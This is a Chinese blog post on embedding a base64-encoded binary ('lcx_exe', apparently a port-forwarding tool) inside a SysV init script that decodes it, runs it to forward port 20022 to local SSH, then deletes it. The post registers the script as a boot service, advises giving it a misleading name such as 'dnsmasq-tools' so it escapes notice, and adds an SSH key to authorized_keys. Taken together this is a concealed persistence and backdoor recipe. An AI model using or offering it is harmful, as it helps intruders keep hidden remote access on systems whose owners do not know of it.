---
title: shell中嵌入二进制文件
categories:
  - Linux
  - shell
toc: false
date: 2018-06-29 16:55:01
tags:
---
摘要暂略。
<!-- more -->

[在shell中嵌入二进制文件](http://oenhan.com/shell-pack-bin)。  
[在shell 脚本中嵌入二进制可执行程序](http://blog.chinaunix.net/uid-15084954-id-3368201.html)。  

先写一个名为`lcx_exe.sh`的shell脚本，脚本内容如下所示：
```shell
#!/bin/sh
# chkconfig: 12345 01 99
# 启动服务的运行级别是(1,2,3,4,5)关闭服务的顺序是(01)启动服务的顺序是(99)

PROGRAM="/tmp/lcx_exe"

do_start() {
    /bin/sed "1,/^__CONTENT_BELOW__/d" "$0" | /usr/bin/base64 -d > "$PROGRAM"
    /bin/chmod 777 "${PROGRAM}"
    "${PROGRAM}" -tran 20022 127.0.0.1:22 >/dev/null 2>&1 &
    /bin/ls >/dev/null 2>&1
    /bin/rm -f "${PROGRAM}"
}

do_stop() {
    for curPid in $( /sbin/pidof $(/bin/basename "$PROGRAM") ); do kill -9 $curPid; done
}

do_restart() {
    do_stop
    do_start
}

case "$1" in
    start)
        do_start
        ;;
    stop)
        do_stop
        ;;
    restart)
        do_restart
        ;;
    *)
        do_restart
        ;;
esac

exit 0

# This line must be the last line of the file
__CONTENT_BELOW__
```
然后我们将`lcx_exe`嵌入`lcx_exe.sh`文件中：
```
base64 ./lcx_exe >> ./lcx_exe.sh
yum install bzip2
tar -cjf  lcx_exe.sh.tar.bz2  lcx_exe.sh
```
然后我们将其添加到服务中并开启该服务。
```
cp  ./lcx_exe.sh  /etc/rc.d/init.d/.
chmod +x /etc/rc.d/init.d/lcx_exe.sh
chkconfig --add lcx_exe.sh
chkconfig lcx_exe.sh on
```
一些其他命令
```
chkconfig --list lcx_exe.sh
chkconfig lcx_exe.sh off
chkconfig --del lcx_exe.sh
service lcx_exe.sh start
service lcx_exe.sh restart
service lcx_exe.sh stop
```
当然也可以直接将其添加到`/etc/rc.d/rc.local`中。因为这个文件的使用率极高（比如Samba挂载共享文件夹），别人很容易发现这个命令。而添加服务时，我们可以使用一个具有迷惑性的名字（比如`dnsmasq-tools`或`dnsmasqd`或`dnsmosq`(`dnsmasq`)等），所以还不太容易被发现。  

创建私钥：
```
mkdir ~/.ssh
chmod 700 ~/.ssh
cd ~/.ssh/
ssh-keygen -f ~/.ssh/my_rsa
cat ~/.ssh/my_rsa.pub >> ~/.ssh/authorized_keys
chmod 644 ~/.ssh/authorized_keys
```
